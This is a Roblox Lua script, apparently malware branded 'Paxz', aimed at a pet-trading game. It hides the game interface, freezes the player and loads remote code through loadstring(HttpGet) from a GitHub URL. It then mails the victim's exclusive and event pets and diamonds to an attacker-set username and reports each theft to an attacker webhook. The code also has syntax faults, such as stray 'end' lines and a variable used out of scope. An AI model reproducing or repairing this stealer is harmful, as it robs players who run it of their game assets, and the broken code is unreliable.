local UserInputService = game:GetService("UserInputService")
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter

for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
    v:Destroy(1)
    end
end

game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true

loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Script.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/API.lua"))()
BypassAntiCheat()
AreaTeleport("Shop")
TeleportToMailbox()
local player = game:GetService("Players").LocalPlayer

local dims = player.leaderstats.Diamonds.Value - 80000000
if dims < 0 then
    dims = 0
end

wait(30)
for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
            local args = {
                [1] = {
                    ["Recipient"] = _G.UserName,
                    ["Diamonds"] = dims,
                    ["Pets"] = {
                        [1] = v.Name
                    },
                    ["Message"] = "made by Paxz"
                }
            }
        end
        Networking.Invoke("Send Mail", unpack(args))
        sendWebhook(_G.Webhook, "@everyone Paxz detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. _G.UserName .. "```")
        dims = 0
        wait(4)
    end
end
end
